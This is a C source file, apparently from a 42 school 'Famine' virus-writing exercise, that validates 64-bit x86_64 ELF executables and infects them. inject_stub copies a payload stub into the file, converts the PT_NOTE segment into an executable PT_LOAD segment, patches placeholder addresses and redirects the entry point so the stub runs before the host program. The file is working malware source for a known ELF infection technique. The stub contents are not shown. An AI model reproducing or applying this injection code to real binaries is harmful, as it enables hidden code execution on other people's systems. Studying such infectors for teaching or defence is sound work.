/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cbopp <cbopp@student.42lausanne.ch>        +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/25 13:23:26 by cbopp             #+#    #+#             */
/*   Updated: 2026/05/14 12:04:59 by ilyanar          ###   LAUSANNE.ch       */
/*                                                                            */
/* ************************************************************************** */

#include "stub.h"
#include "famine.h"

/**
 * @brief validates the ELF magic bytes at the start of file (0x7f)
 */
int check_mem(Elf64_Ehdr *elf)
{
	if (memcmp(elf->e_ident, ELFMAG, SELFMAG) != 0)
		return (printf("Error: Not an ELF file\n"), 1);
	return (0);
}

/**
 * @brief Check for 64-bit
 * e_ident[EI_CLASS] is ELFCLASS32 (1) or ELFCLASS64 (2).
 */
int check_64bit(Elf64_Ehdr *elf) {
	if (elf->e_ident[EI_CLASS] != ELFCLASS64)
		return (printf("Error: Not a 64-bit ELF\n"), 1);
	return (0);
}

/**
 * @brief validates architecture.
 * EM_X86_64 = 62
 */
int check_8664(Elf64_Ehdr *elf) {
	if (elf->e_machine != EM_X86_64)
		return (printf("File architecture not supported. x86_64 only\n"), 1);
	return (0);
}

/**
 * @brief Checks that file is executable or shared library.
 */
int check_exec(Elf64_Ehdr *elf) {
	if (elf->e_type != ET_EXEC && elf->e_type != ET_DYN)
		return (printf("Error: Nt an executable\n"), 1);
	return (0);
}

int check_elf(Elf64_Ehdr *elf) {
	int ret = 0;
	ret += check_mem(elf);
	ret += check_64bit(elf);
	ret += check_8664(elf);
	ret += check_exec(elf);
	return (ret);
}

/*
* Turn the PT_NOTE segment into a PT_LOAD segment that maps our stub,
* and redirect the entry point to it. The stub runs first, then jumps
* back to the original entry point so the host binary behaves normally.
*/
void inject_stub(void *woody, Elf64_Phdr *note_segment, Elf64_Ehdr *ehdr, size_t stub_offset, uint64_t phdr_link_vaddr)
{
  	uint64_t placeholder;
  	uint64_t real_value;
  	void *patch_site;

  	memcpy(woody + stub_offset, stub_bin, stub_bin_len);

  	placeholder = 0xAAAAAAAAAAAAAAAA;
  	real_value = ehdr->e_entry;
  	patch_site = memmem(woody + stub_offset, stub_bin_len, &placeholder, 8);
  	if (patch_site)
  		memcpy(patch_site, &real_value, 8);

  	placeholder = 0xFEEDFACEFEEDFACE;
  	real_value = phdr_link_vaddr;
  	patch_site = memmem(woody + stub_offset, stub_bin_len, &placeholder, 8);
  	if (patch_site)
  		memcpy(patch_site, &real_value, 8);

	note_segment->p_type = PT_LOAD;
	note_segment->p_flags = PF_R | PF_X;
	note_segment->p_offset = stub_offset;
	note_segment->p_vaddr = 0xc000000;
	note_segment->p_paddr = 0xc000000;
	note_segment->p_filesz = stub_bin_len;
	note_segment->p_memsz = stub_bin_len;
	note_segment->p_align = 0x1000;

	ehdr->e_entry = 0xc000000;
}

int main(int argc, char **argv) {
	if (argc != 2)
  		return (1);
	return (infect_file(argv[1], "woody"));
}
